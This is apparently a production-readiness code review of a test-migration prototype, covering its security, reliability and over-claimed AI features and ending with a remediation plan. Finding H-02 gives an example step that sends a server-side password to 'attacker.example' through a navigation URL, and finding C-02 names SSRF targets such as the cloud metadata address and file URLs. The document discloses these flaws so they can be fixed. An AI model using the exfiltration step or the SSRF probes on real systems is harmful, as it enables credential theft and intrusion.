# AutoMigrate AI: Production-Readiness Code Review

| | |
|---|---|
| **Reviewer role** | Principal Engineer, production-readiness review |
| **Date** | 2026-10-12 |
| **Scope** | Whole repository: `backend/`, `frontend/`, Docker/nginx, scripts, samples, knowledge base, docs, committed `generated/` output. Checked against [AutoMigrate_AI_Hackathon_Prototype_Plan.md](../AutoMigrate_AI_Hackathon_Prototype_Plan.md), [README.md](../README.md) and [ARCHITECTURE.md](../ARCHITECTURE.md) |
| **Method** | Static review of every source file. No code was changed. Committed run artifacts (`generated/**/artifacts/runs`, `backend/.pytest_cache`) were used as runtime evidence |
| **Limitation** | The test suites were **not** re-run. Neither committed virtualenv works on another machine (see H-08), and this machine has no Python or Node.js. Installing a toolchain was out of scope for a no-changes review. The last recorded backend run (`backend/.pytest_cache/v/cache/lastfailed = {}`) had no failures |

---

## 1. Executive Summary

**Verdict: good hackathon prototype, NOT production-ready. Safe only as a single-user demo on localhost.**

The core design is better than most prototypes:

- **Generated code is deterministic.** Framework code comes only from the keyword knowledge base, and every user string is inserted as a Python `repr()` literal.
- **The LLM's role is narrow.** It writes advisory text and picks one candidate ID during repair, and its output is schema-validated.
- **Execution is controlled.** There is no shell, the command line is fixed, paths are checked for traversal, and the whole process tree is killed on timeout.
- **Mocks are labelled.** Mock qTest and the "Representative ICAP Export Format" are clearly marked as such.

I found **no direct code-injection path** from an uploaded asset into the generated Python.

What blocks production is the **operating envelope**, not the code-generation core:

1. **Unauthenticated remote execution surface.** Anyone who can reach port 8001 can upload an asset and make the server launch headless browsers. The browsers run with `--no-sandbox`, can navigate to any URL (SSRF), and can read server-side `AM_DATA_*` values and send them out.
2. **Single-request denial of service.** A ~10 KB upload with nested reusable blocks expands to N^5 steps and can exhaust memory.
3. **State integrity.** The store is in-memory, uses read-modify-write without locks, and reuses IDs after a restart. Concurrent generate, execute and repair calls on one migration can corrupt the record or run half-written projects.
4. **Self-healing can hide real defects.** Under some conditions a genuine assertion failure is "repaired" by pointing the step at a different element, and the result is marked `VERIFIED`.
5. **Claims are ahead of reality.** The default configuration has **no LLM** (a rule-based mock), but the UI shows "AI agent…" and "LLM analysis". Several documented features do not exist, and docs say secrets are "masked in UI and reports" while the API returns them in plaintext.
6. **Not reproducible.** The repo ships 1.1 GB of broken virtualenvs pinned to other people's machines, two backend Dockerfiles, and no Python lockfile.

### Scorecard

| Area | Rating | Notes |
|------|--------|-------|
| Architecture | 🟢 Good | Clean layering, DI composition root, ports and adapters for LLM and qTest |
| Generated-code safety | 🟢 Good | KB-only templates, `repr` literals, identifier/dotted-name checks, compile gate |
| Shell execution | 🟡 Fair | No shell and a fixed argv, but no sandbox, an env denylist instead of an allowlist, and no concurrency limit |
| Security (overall) | 🔴 Poor | No auth, SSRF, DoS, secret exposure, port exposed outside nginx |
| AI prompt safety | 🟡 Fair | Schema-bound output, but raw untrusted text in prompts, inconsistent masking, no audit trail |
| Hallucination risk | 🟡 Fair | Contained for code; repair choice and confidence can mislead |
| File upload | 🟠 Weak | Extension and size check only after the full body is read; no structural limits |
| Secrets management | 🟠 Weak | `SecretStr` used, but test-data secrets are returned by the API and written in plaintext |
| Error handling | 🟢 Good | One error contract, no stack traces leaked; some exception text is echoed |
| Code quality | 🟢 Good | Typed, small functions, clear naming; some duplication and complex replay logic |
| Test coverage | 🟡 Fair | ~500 backend unit/API tests and 27 frontend tests; no e2e, no CI, no abuse or concurrency tests |
| Frontend/backend integration | 🟡 Fair | Typed error contract and timeouts; sync long requests; metric inaccuracies |
| Scalability | 🔴 Poor | In-memory state, sync request threads run pytest and browsers, no queue |
| Maintainability | 🟡 Fair | Good structure; stale docs and artifacts, duplicate Dockerfiles, committed venvs |
| Demo reliability | 🟠 Weak | `--reload` wipes state when code is generated; browsers or driver downloads needed |

### Findings count

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 3 |
| 🟠 HIGH | 9 |
| 🟡 MEDIUM | 12 |
| ⚪ LOW | 8 |

---

## 2. Strengths (keep these)

- **KB-only code generation** ([keyword_resolver.py](../backend/app/agents/keyword_resolver.py), [base_generator.py](../backend/app/generators/base_generator.py)). Placeholders are bound through `_binding()`. Strings become `repr()` literals, identifiers go through `_is_safe_identifier`, page references through `_dotted_name`, and Selenium `By` values through an allowlist. Docstrings and comments are escaped (`_docstring`, `_printable`). Every artifact is compiled before it is written (`_check_syntax`).
- **LLM output is constrained.** `generate_json` validates against strict Pydantic schemas (`AITestAnalysis`, `AIRepairSuggestion`) with length caps. In repair, the LLM can only return a candidate *ID* taken from the DOM, and the code change is regenerated deterministically. `_single_file_change` then checks that the diff is minimal.
- **Execution hygiene** ([runner.py](../backend/app/execution/runner.py)). `shell=False`, fixed argv, `stdin=DEVNULL`, new process group, tree kill on timeout, output truncation, a run directory per attempt, and `resolve_project()` traversal and symlink checks.
- **Honest scoping.** `QTestAdapter` (real) raises 501 instead of returning fake IDs, the input format is explicitly "Representative", and `win_*` keywords are reported as future adapters rather than converted.
- **Consistent error contract** ([errors.py](../backend/app/api/errors.py)): `{status, code, message, details}` with a catch-all 500 that does not leak internals.
- **Large, focused unit test suite** (~500 backend tests covering parser, KB, generators, validation, execution, repair, qTest and API).

---

## 3. Findings

Format: **ID · Title**, then Location, Evidence, Impact and Recommendation.

### 🔴 CRITICAL

#### C-01 · Unauthenticated API with server-side execution is exposed on all interfaces, bypassing nginx

- **Location:** [docker-compose.yml](../docker-compose.yml) (`ports: "8001:8001"`), [Dockerfile.backend](../Dockerfile.backend) (`--host 0.0.0.0`), [main.py](../backend/app/main.py) (no auth middleware, `/docs` always on, `demo_app` always mounted).
- **Evidence:** No authentication or authorization exists on any route (ARCHITECTURE P8: "No auth"). Compose publishes the backend port on every host interface, next to the nginx front door on 8080. Calls to 8001 skip nginx's `client_max_body_size 2m` and security headers.
- **Impact:** Anyone on the same network (conference Wi-Fi, office LAN, cloud VM) can upload assets and trigger `execute`/`repair`. Each call spawns pytest and Chromium on the server. Combined with C-02 and C-03, this gives remote SSRF and denial of service.
- **Recommendation:** Do not publish 8001: use `expose:` only, or bind to `127.0.0.1:8001:8001`. Add an API-key or OIDC dependency on all `/api/migration/*` and `/api/qtest/*` routes. Disable `/docs` and the `demo` router outside `environment in {local, demo}`. Add `TrustedHostMiddleware`.

#### C-02 · SSRF and local-file access from a server-side browser running with `--no-sandbox`

- **Location:** [keyword_resolver.py](../backend/app/agents/keyword_resolver.py) `_satisfies()` L231 (`if value.startswith("${"): return True`), [testdata_loader.py](../backend/app/generators/scaffold/testdata_loader.py), [Dockerfile.backend](../Dockerfile.backend) L12 (`AM_BROWSER_ARGS="--no-sandbox …"`).
- **Evidence:**
  - `web_navigate` accepts any `http(s)` host, including `169.254.169.254`, `localhost:8001/api/...` and internal RFC1918 hosts.
  - A URL that starts with `${VAR}` skips validation entirely. Test-data values are never URL-validated, so `BASE_URL` can be `file:///…` or any other scheme Chromium accepts.
  - The browser runs in the API container, with the API's network identity, and with the Chromium sandbox disabled.
  - On failure, the conftest writes the page DOM to disk. The repair agent parses it, and up to 120 characters of element text per candidate flow back to the client in `RepairProposal.diagnosis/explanation` and to the LLM. That is a limited read-back channel for internal pages.
- **Impact:** An uploaded test can probe internal services and cloud metadata endpoints, call the backend's own API from inside, and read fragments of internal pages. A browser exploit on a hostile page lands in the API container without sandbox protection.
- **Recommendation:**
  - Enforce a navigation **allowlist** (`ALLOWED_TARGET_HOSTS`), checked both at plan time and at runtime in `DataSet.resolve` or a `page.route` guard.
  - Validate resolved URLs after `${VAR}` substitution.
  - Block link-local, loopback (except the demo app) and private ranges.
  - Run browsers in a separate execution container with egress policy, and re-enable the Chromium sandbox (seccomp profile, non-root user).

#### C-03 · Denial of service: one small upload can exhaust memory or CPU through reusable-block fan-out

- **Location:** [json_parser.py](../backend/app/parsers/json_parser.py) `_StepExpander._expand_reference` L210–L222 (`max_block_depth = 5` only). There is no limit on total steps, blocks, objects or variables in [canonical_test.py](../backend/app/models/canonical_test.py).
- **Evidence:** Nesting depth is capped, but **fan-out is not**. Block `B1` holds N references to `B2`, `B2` holds N references to `B3`, and so on to `B5`, and the test holds N references to `B1`. That expands to N⁵ `TestStep` Pydantic objects. N = 40 gives about 10⁸ steps from an upload of a few KB, far below `MAX_UPLOAD_BYTES`. `expand_block()` then expands every used block again. *(Derived from code; not run, see Limitation.)*
- **Impact:** One unauthenticated request can pin a worker thread and drive the process out of memory, taking the whole demo or service down.
- **Recommendation:** Add `MAX_EXPANDED_STEPS` (for example 500), checked incrementally inside `_expand`. Add caps on blocks, objects, variables and string lengths in `representative_format.py`. Add a regression test for the "block bomb".

### 🟠 HIGH

#### H-01 · Plaintext test-data secrets are returned by the API, shown in the UI and written to disk, contrary to the docs

- **Location:** [base_generator.py](../backend/app/generators/base_generator.py) `_data_file()` L230 (writes `variables` unmasked), [routes_migration.py](../backend/app/api/routes_migration.py) `/generate` → `GeneratedProject.artifacts[].content`, [ARCHITECTURE.md](../ARCHITECTURE.md) ("Values for keys named PASSWORD… are masked in UI and reports").
- **Evidence:** Masking (`TestData.masked()`) is used **only** in the LLM context. The `testdata/*_data.json` artifact containing `"PASSWORD": "demo_password"` comes back verbatim from `/generate` and is shown in the Generated Code view. `sensitiveKeys` is listed, but the values are not masked.
- **Impact:** Any real credential in an uploaded asset is exposed to every API client and kept in memory and on disk indefinitely. The documentation makes a false security claim.
- **Recommendation:** Write sensitive values as `${ENV:AM_DATA_<NAME>}` indirections, or empty values plus a required env override. Mask sensitive values in all API responses. Fix the ARCHITECTURE claim.

#### H-02 · `AM_DATA_*` server environment overrides can be exfiltrated by any uploader

- **Location:** [runner.py](../backend/app/execution/runner.py) `_environment()` L165 (passes all `AM_DATA_*`, even names containing `PASSWORD`), [testdata_loader.py](../backend/app/generators/scaffold/testdata_loader.py) L22 (`os.environ` wins over file data).
- **Evidence:** The README tells operators to supply environment-specific data through `AM_DATA_<NAME>`. An uploader can declare `testData: {"PASSWORD": "x"}` and add a step `web_navigate "https://attacker.example/?p=${PASSWORD}"`. At runtime `DataSet.get("PASSWORD")` returns the **server's** `AM_DATA_PASSWORD`, and the browser sends it to the attacker.
- **Impact:** Operator-supplied credentials leak to any user who can upload.
- **Recommendation:** Scope overrides per migration or project instead of process-wide. Combined with the C-02 allowlist, never interpolate sensitive variables into navigation URLs. Treat `AM_DATA_*` as secrets that only approved targets can use.

#### H-03 · Unsandboxed execution of generated code; env filtering is a denylist

- **Location:** [runner.py](../backend/app/execution/runner.py) L31, L133, L165; [coding_standards.json](../backend/app/knowledge/coding_standards.json).
- **Evidence:**
  - Tests run with the **backend's** interpreter (`sys.executable`), the backend's OS user, filesystem and network, and the full process environment minus names containing `API_KEY|TOKEN|SECRET|PASSWORD`. Names such as `AWS_ACCESS_KEY_ID`, `*_CONNECTION_STRING`, `*_CREDENTIALS`, `*_PWD` and `DATABASE_URL` pass through.
  - The static validator uses a call **denylist** (`eval`, `exec`, `os.system`, …) while allowing `os` and `pathlib`, so it is not a security boundary.
  - ARCHITECTURE describes this as "sandboxed", but it is only a path check.
- **Impact:** Today the KB templates are safe. Any future template, scaffold or KB bug, however, becomes code execution inside the API process's trust boundary, with its secrets and network.
- **Recommendation:**
  - Run executions in an isolated worker (separate container or job) with no secrets, read-only code mount, CPU, memory and pids limits, and egress allowlisting.
  - Build the child env from an **allowlist** (`PATH`, `PYTHON*`, `PLAYWRIGHT_BROWSERS_PATH`, `AM_*` config).
  - Correct the "sandboxed" wording.

#### H-04 · Lost updates and file races: no per-migration concurrency control

- **Location:** [migration_service.py](../backend/app/services/migration_service.py), [repair_service.py](../backend/app/services/repair_service.py), [execution_service.py](../backend/app/services/execution_service.py), [migration_store.py](../backend/app/storage/migration_store.py).
- **Evidence:**
  - Every service does `get` → long work → `save(record.model_copy(...))` from the *stale* snapshot. The store lock only protects the dict access.
  - Endpoints are sync `def`, so they run concurrently in the threadpool.
  - `repair(apply=True)` writes the candidate code **into the live project directory** before the re-run (L120). A concurrent `execute` or `generate` can run half-repaired code, overwrite the files, or drop the other call's executions or repairs on save.
- **Impact:** Corrupted migration history, wrong traceability, flaky demos when buttons are clicked twice or autopilot overlaps a manual action.
- **Recommendation:** Add a per-migration lock (or optimistic version field with 409 on conflict) held for the whole operation. Have repair build and run in a temporary sibling directory and swap it in atomically only after it passes.

#### H-05 · Self-healing can mask real application defects (assertion failures "repaired" to a different element)

- **Location:** [repair_agent.py](../backend/app/agents/repair_agent.py) `_LOCATOR_ERROR` L41, `locator_present` check L84, `_choose` L179; [dom_locators.py](../backend/app/agents/dom_locators.py) `locator_present` returns `None` for css/xpath.
- **Evidence:**
  - The locator-error regex matches `waiting for locator`. Playwright puts that phrase in the call log of **every** failure message, including `expect(...).to_have_text` mismatches; see the committed `junit.xml` under `generated/playwright/MIG-001/artifacts/runs/*`.
  - For `id`/`name`/`data-testid` locators the "still present" check blocks a repair. For `css`/`xpath` it returns `None`, so the repair goes ahead.
  - The agent can then retarget a `web_assertText` step to another element whose text matches. The run passes and the repair is recorded as `VERIFIED`.
  - The LLM path accepts any candidate with `score > 0`, bypassing the `MIN_CANDIDATE_SCORE = 0.3` floor the heuristic path enforces. Candidate text comes from the page under test, which is a prompt-injection vector.
- **Impact:** A "self-healed green" test that no longer checks what it was written to check, which is the worst failure mode for a test-migration product.
- **Recommendation:**
  - Classify failures by **exception type** (`TimeoutError` on an action, `NoSuchElementException`), not by message text.
  - Never auto-apply repairs on assertion steps; require human approval.
  - Require a positive "locator absent" result (evaluate css/xpath in the live page, or refuse).
  - Apply the same minimum score to LLM picks.
  - Rename `VERIFIED` to `PASSED_AFTER_REPAIR` and require reviewer sign-off.

#### H-06 · AI capabilities and features are over-claimed relative to what runs

- **Location:** [AnalysisPanel.jsx](../frontend/src/components/AnalysisPanel.jsx), [RepairPanel.jsx](../frontend/src/components/RepairPanel.jsx), [repair_agent.py](../backend/app/agents/repair_agent.py) `_choose` (`"source": "llm"`), [README.md](../README.md), [ARCHITECTURE.md](../ARCHITECTURE.md), [docs/api.md](api.md).
- **Evidence:**
  - With the default `LLM_PROVIDER=mock`, the "AI summary", "AI agent is reading steps…" and repair "LLM analysis" chip all come from fixed Python rules in [mock_provider.py](../backend/app/llm/mock_provider.py). `analysisSource` is set to `"llm"` because the mock is an `LLMProvider`.
  - Repair "confidence" is a formula (`0.5 + 0.45 × score`) shown as a percentage.
  - The Azure provider has only been tested against a mocked `urlopen`.
  - README and ARCHITECTURE promise a "no-build HTML dashboard" fallback that does not exist.
  - ARCHITECTURE says secrets are masked in UI and reports (false, see H-01) and calls execution "sandboxed" (see H-03).
  - `docs/api.md` still lists upload, analyze, generate and report as "Stub" and omits `/keywords`.
- **Impact:** Credibility risk with judges and stakeholders. The plan's §24 Definition of Done says *"No unsupported … capability is falsely presented as implemented"*, and §26 explicitly warns against over-claiming AI.
- **Recommendation:**
  - Show "Mock LLM (rule-based)" clearly whenever the provider is `mock`, and set `analysisSource="mock"`.
  - Label confidence as a "heuristic similarity score".
  - Remove the non-existent features from the docs, regenerate `docs/api.md` from OpenAPI, and fix the masking and sandbox claims.
  - Run at least one recorded session against the real Azure provider before claiming GenAI.

#### H-07 · State is in-memory, IDs reset on restart, and the mock qTest keeps stale cross-session data

- **Location:** [migration_store.py](../backend/app/storage/migration_store.py) (counter `MIG-001…`), [mock_qtest_adapter.py](../backend/app/qtest/mock_qtest_adapter.py) L100 (dedupes runs on `(migration_id, target, attempt)`), [migration_service.py](../backend/app/services/migration_service.py) (`generated/<target>/<id>`).
- **Evidence:**
  - After a restart, IDs start again at `MIG-001`. New generations overwrite the previous session's `generated/…/MIG-001` folder; committed artifacts show MIG-001 regenerated at least 5 times.
  - `data/mock_qtest.json` **persists**. A new `MIG-001` attempt 1 is "deduplicated" onto the old run, so `QR-n` links point at a previous session's status and logs.
  - Mock qTest test cases are also keyed only by `source_test_case_id`, so different uploads of `ICAP-TC-001` merge.
- **Impact:** Broken traceability, the product's core promise. Data loss on every restart.
- **Recommendation:** Use a persistent store (SQLite or Postgres) with UUID or ULID migration IDs, include the migration ID in qTest dedupe keys, and add a retention policy.

#### H-08 · The build is not reproducible; the repository ships broken environments

- **Location:** repository root.
- **Evidence:**
  - `.venv/` is 199 MB and points to `C:\Users\pandiv\…\Python312`. `backend/.venv-local/` is 907 MB, uses Python **3.14** from `C:\Program Files\Python314`, and is *not* covered by `.gitignore`. `frontend/node_modules/` is 43 MB. A `Hackathon prompts.pdf` (7 MB) and `frontend/dist` are also bundled.
  - Neither venv runs on another machine.
  - The two venvs resolve different FastAPI versions (0.142.2 vs 0.143.0).
  - Python dependencies are range-pinned with no lockfile or hashes. Test tools (`pytest`, `pyflakes`, `httpx2`) are mixed into runtime requirements.
  - There are two backend Dockerfiles. [backend/Dockerfile](../backend/Dockerfile) is stale, runs as root and copies the whole backend.
  - `httpx2` should be confirmed as the intended package (provenance check).
- **Impact:** A clean machine cannot reproduce "works on my machine". This also stopped this review from running the tests.
- **Recommendation:**
  - Delete the committed venvs, `node_modules` and `dist`, and add `.venv*/` to `.gitignore`.
  - Add `requirements.lock` (pip-tools or uv) with hashes, and split `requirements-dev.txt`.
  - Delete `backend/Dockerfile`.
  - Pin base images by digest.

#### H-09 · Demo reliability: the documented dev command wipes all state mid-demo

- **Location:** [README.md](../README.md) L89 (`uvicorn … --reload --app-dir backend` run from the repo root), [Dashboard.jsx](../frontend/src/pages/Dashboard.jsx) L102.
- **Evidence:**
  - `--reload` watches the working directory, which is the repo root, for `*.py` changes.
  - Every `generate` and `repair(apply)` writes `.py` files under `generated/`, which restarts the server and clears the in-memory store, so the next call returns `MIGRATION_NOT_FOUND`.
  - The UI even shows a workaround hint ("The backend was probably restarted — upload the asset again").
  - Committed run folders show IDs restarting at `MIG-001` throughout the day.
- **Impact:** Highest-probability demo failure when the demo runs outside Docker.
- **Recommendation:** Remove `--reload` from the demo command, or add `--reload-dir backend/app`. Move `generated/` outside the source tree, or configure it with `GENERATED_DIR`.

### 🟡 MEDIUM

#### M-01 · Upload handling: size is checked only after the full body is received; no structural limits
`await file.read(max+1)` ([routes_migration.py](../backend/app/api/routes_migration.py) L40) runs **after** Starlette has spooled the whole multipart body. Port 8001 bypasses nginx's 2 MB limit (C-01). The only checks are the file extension and the size; there is no MIME check and no limits on string length, step count or object count (C-03). Large string values flow into generated code, LLM prompts and the UI.
**Fix:** Add an ASGI body-size limit middleware, multipart limits, and Pydantic `max_length` caps on raw fields.

#### M-02 · LLM data governance and prompt-injection exposure
- `TestAnalyzer` sends `name`, `description` and `expected` unmasked. The repair agent sends DOM text from the application under test.
- Masking rules differ between [test_analyzer.py](../backend/app/agents/test_analyzer.py) L55 (`TestData.is_sensitive`) and [repair_agent.py](../backend/app/agents/repair_agent.py) L215 (substring `password`/`secret`). For example, a literal value typed into `apiToken` is masked in analysis but sent in repair.
- There is no prompt or response audit log, no `max_tokens`, no retry or backoff, and no 429 handling. The prompt contains no instruction to treat user JSON as data.

**Fix:**
- Use one shared redaction function and delimit untrusted content.
- Log the prompt hash, model, latency and validated response.
- Cap tokens.
- Get approval for sending asset content to an external LLM.

#### M-03 · Cross-origin and DNS-rebinding exposure of the local API
There is no Host-header validation. `multipart/form-data` POST is a CORS "simple request", so any website the presenter visits can trigger `/upload` on `localhost:8001` without a preflight. With DNS rebinding the whole API is reachable.
**Fix:** Add `TrustedHostMiddleware`, require a custom header or API key on every mutating route, and reject non-JSON content types on JSON routes. Whether current FastAPI accepts `text/plain` JSON bodies should be verified.

#### M-04 · Long-running work runs in synchronous request threads
`execute` (up to 120 s plus a 10 s kill grace), `repair(apply)` (LLM, then build, then a run, up to about 300 s) and `analyze` (LLM 30 s) all block AnyIO threadpool workers (default 40). The demo app that tests navigate to is served by the **same** pool. There is no concurrency limit on browsers, no cancellation, and a client timeout leaves the work running and later mutating state.
**Fix:**
- Use a job queue (RQ, Celery or Arq) with `202 Accepted` and polling or SSE.
- Add a semaphore on concurrent executions.
- Use idempotency keys.

#### M-05 · Unbounded growth of memory and disk
Each `ExecutionResult` keeps up to 200 K characters each of stdout, stderr and logs in memory forever. `artifacts/runs/*`, screenshots and DOM snapshots are never pruned, and `mock_qtest.json` only grows. **Fix:** Store large outputs on disk or object storage with references, and add retention and cleanup jobs.

#### M-06 · Model integrity validators are bypassed; replay logic is fragile
Services update state with `model_copy(update=…)`, which in Pydantic v2 does **not** re-run validators, so `MigrationRecord._check_integrity` never runs after creation. `DemoFault.repairs_before` is `exclude=True`, so the planned JSON store would lose it and break `current_test_case()` replay. The fault and repair interleaving in `current_test_case` is hard to reason about.
**Fix:** Use `model_validate({**record.model_dump(), …})` or explicit invariants. Persist events and derive state from them.

#### M-07 · Keyword semantics diverge across targets or have no effect
- `web_getText` assigns a Python variable that later steps cannot use, because `${VAR}` only resolves from test data. The keyword therefore does nothing useful.
- Selenium `web_assertText` is an exact, one-shot `==`. Playwright's `to_have_text` retries and normalises whitespace, so the same source test can pass on one target and flake on the other.
- `web_select` only selects by value.
- Playwright `css` locators are passed raw, so engine prefixes (`text=`, `>>`) are accepted.

**Fix:**
- Add a runtime variable store.
- Wrap the Selenium assertion in `WebDriverWait` with normalisation.
- Document the semantics as ASSUMED in the plan UI.

#### M-08 · Error handling gaps
- `_simple()` handlers echo `str(exc)` to clients. For example, the real qTest 501 message includes the internal `QTEST_BASE_URL` host.
- `ProjectNotAllowedError` becomes a 409 with a misleading message.
- Repair rollback (`generator.write(generated.artifacts, …)`) is not atomic; a partial write leaves a mixed project.
- There are no correlation IDs and no structured logs.

**Fix:** Use stable client messages with server-side detail logged, an atomic directory swap (H-04), and request-ID middleware.

#### M-09 · Test coverage gaps
- There is no CI pipeline and no coverage measurement, and [tests/e2e](../tests/e2e) is empty.
- Real-browser runs are not automated; `TestRealSubprocess` deliberately avoids browsers.
- There are no tests for concurrency, abuse (block bomb, SSRF URLs, oversize multipart), the cross-session qTest dedupe, or `--reload` behaviour.
- Frontend: 27 tests covering the API client, pipeline reducer and CodeView only. No tests for the 13 panels or the autopilot flow.

**Fix:** See the remediation plan, Phase 2.

#### M-10 · Frontend/backend integration and metric accuracy
- `timings[step]` stores only the **last** call per step, so retried executes and repairs are under-counted.
- "Effort reduction" compares a user-typed manual estimate (persisted in `localStorage`) with measured machine time and excludes human review. Backend `ai_migration_seconds` measures only analyze plus generate, so two different "times" exist.
- `selectTarget` can start `analyze` while another action is busy.
- The analysis panel lists each blocking item twice (`blockingReasons` plus `unsupportedItems`).

**Fix:**
- Sum the timings.
- Use one backend-measured end-to-end duration.
- Label the manual baseline as user input.
- Disable controls while busy.

#### M-11 · Security headers and CSP missing
[nginx.conf](../docker/nginx.conf) sets `nosniff`, `DENY` and `no-referrer` but has **no Content-Security-Policy** and no HSTS (for when TLS is added). The backend serves `/docs` (Swagger UI from a CDN) on the exposed port. **Fix:** Add a strict CSP for the SPA and turn off docs in non-local environments.

#### M-12 · Health check is shallow
`/api/health` returns static config only. It does not check browser availability, a writable `generated/` directory, free disk, a loadable mock qTest file or LLM reachability. Docker reports "healthy" while executions would fail. **Fix:** Separate liveness and readiness checks, with a readiness check that probes those dependencies.

### ⚪ LOW

| ID | Finding | Location | Recommendation |
|----|---------|----------|----------------|
| L-01 | `docs/api.md` is stale (Stub labels, wrong response type for `/generate`, missing `/keywords`) and has mojibake (`â€“`). README says to install `openai` for Azure, but the provider uses `urllib` | [docs/api.md](api.md), [README.md](../README.md) | Generate the docs from OpenAPI; fix the encoding |
| L-02 | Stale generated output is committed; `generated/selenium/MIG-SAMPLELOGIN/conftest.py` differs from the current scaffold; `junit.xml` records the developer's hostname | [generated/](../generated) | Remove it from the deliverable; it is already in `.gitignore` |
| L-03 | Duplication: sensitivity detection is implemented 3 times; `KeywordResolver`, `LocatorResolver` and `load_knowledge` are instantiated repeatedly in [dependencies.py](../backend/app/dependencies.py); `current_test_case` lives in `repair_service` but `migration`, `validation` and `report` services import it (layering smell); screenshot and DOM helpers are duplicated in both conftest scaffolds | various | Extract `redaction.py` and `migration_state.py`; build each resolver once |
| L-04 | Config: `environment` has no `prod` value; there are no bounds on `execution_timeout_seconds` or `max_upload_bytes`; the CORS default differs between `config.py`, `.env.example` and compose | [config.py](../backend/app/config.py) | Add `Field(gt=…, le=…)` bounds and environment profiles |
| L-05 | Local setup does not install browsers by default (`-InstallBrowsers` is opt-in); Selenium Manager downloads drivers at runtime, so offline demos fail outside Docker | [scripts/setup.ps1](../scripts/setup.ps1) | Install browsers by default; document the offline Docker path as the primary demo path |
| L-06 | The `demo_app` router is always mounted in the production app | [main.py](../backend/app/main.py) L24 | Mount it only when `environment in {local, demo}` |
| L-07 | Plan deliverables missing: `LICENSE`, `docs/demo-script.md`, `XmlParser`/`CsvParser` (descoped, which is fine, but not recorded in the plan's DoD) | repo root | Add them or record them as descoped |
| L-08 | The sample `BASE_URL` is hard-coded to `http://localhost:8001/demo`, so tests break if the port changes | [samples/icap/login_test.json](../samples/icap/login_test.json) | Default from an `AM_DATA_BASE_URL` set by the backend at runtime |

---

## 4. Area-by-Area Assessment

| Area | Assessment | Findings |
|------|------------|----------|
| **Architecture** | Clean hexagonal-style layering (parsers → canonical model → agents → generators → execution → adapters), DI root, provider factories. Main gaps: no async job tier, no persistence tier, and execution sharing the API's trust boundary | H-03, H-04, H-07, M-04 |
| **Security** | Unauthenticated, network-exposed, SSRF-capable execution service | C-01, C-02, H-01, H-02, H-03, M-03, M-11 |
| **Code quality** | High: typed, small cohesive functions, explicit errors, good naming. Complexity hotspots: `current_test_case`, `_single_file_change`, `validators.py` (466 lines) | M-06 |
| **Duplication** | Moderate and contained | L-03, H-08 (two Dockerfiles) |
| **Error handling** | Uniform contract, no stack-trace leakage; some messages echo internals; rollback not atomic | M-08 |
| **AI prompt safety** | Strong output constraints; weak input hygiene and governance | M-02, H-05 |
| **Hallucination risk** | Code: very low (KB-only). Narrative: advisory, length-capped, but presented as authoritative. Repair: an LLM choice with low similarity is accepted; confidence is not calibrated | H-05, H-06 |
| **Generated-code safety** | Strong. `repr` literals, identifier and dotted-name checks, compile gate, import allowlist, forbidden-call scan. Validation is a quality gate, **not** a security boundary | H-03 |
| **Shell execution** | Good mechanics (no shell, fixed argv, tree kill); missing isolation, env allowlist, concurrency cap and resource limits | H-03, M-04 |
| **File upload** | Extension and size only; DoS via expansion; size enforced late | C-03, M-01 |
| **Secrets management** | `SecretStr` and `.env` are fine; test-data secrets leak through API, disk and `AM_DATA_*` | H-01, H-02 |
| **Dependencies** | Range pins, no lockfile, dev tools mixed into runtime, committed broken venvs, unpinned base images, two Dockerfiles | H-08 |
| **Test coverage** | Broad unit coverage; no e2e, no CI, no security or concurrency tests | M-09 |
| **Frontend/backend integration** | Typed error contract, client timeouts above server timeouts, same-origin proxy. Sync long calls, metric inaccuracies, state lost on backend restart | M-04, M-10, H-09 |
| **Scalability** | Single process, in-memory state, browsers run in request threads, no horizontal scale path | H-07, M-04, M-05 |
| **Maintainability** | Good module boundaries and docstrings; stale docs and artifacts; KB-driven extensibility is a plus | L-01, L-02, H-08 |
| **Unsupported claims** | Mock LLM shown as AI or LLM; non-existent HTML fallback; false masking and sandbox claims; stale API doc | H-06, H-01, H-03, L-01 |
| **Demo reliability** | Docker path is reasonable; local path is fragile | H-09, H-07, L-05, L-08, M-07 |

---

## 5. Plan Conformance (Plan §24 Definition of Done)

| DoD item | Status | Note |
|----------|--------|------|
| Upload sample ICAP asset | ✅ | Representative JSON format only (honestly labelled) |
| Parser → Canonical Test Model | ✅ | |
| UI shows steps and keywords | ✅ | |
| KB maps all supported web keywords | ✅ | `web_getText` and `web_wait` are ASSUMED semantics (M-07) |
| Playwright code generated | ✅ | |
| Selenium code generated | ✅ | Assertion semantics differ from Playwright (M-07) |
| Generated code passes validation | ✅ | |
| Generated test executes | ✅ | Committed `junit.xml` shows passing runs |
| Execution result in UI | ✅ | |
| Intentional locator failure demo | ✅ | DEMO MODE, clearly labelled |
| AI repair fixes the failure | ⚠️ | Works, but the default "AI" is the rule-based mock (H-06) |
| Test passes after repair | ✅ | Committed attempt2 runs |
| qTest mock traceability displayed | ⚠️ | Stale cross-session links after a restart (H-07) |
| Migration report generated | ✅ | |
| No unsupported capability presented as implemented | ❌ | H-06, H-01 (masking claim), HTML fallback, `docs/api.md` |
| Plan §14 "Do not allow arbitrary shell commands from user input" | ✅ | Met. Arbitrary *navigation* is the remaining gap (C-02) |
| Plan §18 "percentage must be calculated from actual demo timings" | ⚠️ | Machine time vs a user-typed baseline; timings under-counted (M-10) |

---

## 6. Prioritized Remediation Plan

Effort: **S** = under half a day, **M** = 1–3 days, **L** = about 1 week or more.

### Phase 0: Before any demo on a shared network (blockers, about 2–3 days)

| # | Action | Fixes | Effort |
|---|--------|-------|--------|
| 0.1 | Stop publishing port 8001 (nginx only) or bind to `127.0.0.1`; turn off `/docs` and the demo router outside local or demo environments | C-01, L-06 | S |
| 0.2 | Add API-key auth (FastAPI dependency) on all mutating routes plus `TrustedHostMiddleware` | C-01, M-03 | S |
| 0.3 | Cap reusable-block expansion (`MAX_EXPANDED_STEPS`), plus counts and string lengths in raw models; add regression tests | C-03, M-01 | S |
| 0.4 | Navigation allowlist enforced at plan time **and** at runtime (resolved URL); block link-local, loopback (except the demo app), private ranges and `file:` | C-02, H-02 | M |
| 0.5 | Mask sensitive test-data values in all API responses and stop writing them into artifacts | H-01 | S |
| 0.6 | Remove `--reload` from the demo command (or `--reload-dir backend/app`) and move `generated/` out of the watched tree | H-09 | S |
| 0.7 | Per-migration lock around analyze, generate, validate, execute, repair and sync | H-04 | S |
